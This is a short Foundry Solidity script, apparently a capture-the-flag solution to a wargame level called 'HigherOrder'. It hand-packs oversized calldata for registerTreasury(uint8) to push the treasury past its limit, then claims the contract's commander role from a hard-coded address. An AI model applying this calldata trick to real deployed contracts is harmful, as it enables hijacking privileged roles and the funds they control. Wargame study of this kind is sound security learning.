// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IHigherOrder {
    function commander() external view returns (address);

    function treasury() external view returns (uint256);

    function registerTreasury(uint8) external;

    function claimLeadership() external;
}

contract HigherOrderScript is Script {
    function run() external {
        vm.startBroadcast(0x777dcCD91f7C62717DBa44db3504bDf47C75E2F1);

        IHigherOrder target = IHigherOrder(
            0x2afFdc5Bdf1Ed2530dC6cBF22F5833914B228622
        );

        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
        bytes32 max = bytes32(type(uint256).max);
        bytes memory data = abi.encodePacked(selector, max);
        console.logBytes(data);

        (bool success, ) = address(target).call(data);
        require(success, "registerTreasury failed");

        target.claimLeadership();
        require(
            target.commander() == 0x777dcCD91f7C62717DBa44db3504bDf47C75E2F1,
            "not commander"
        );

        vm.stopBroadcast();
    }
}
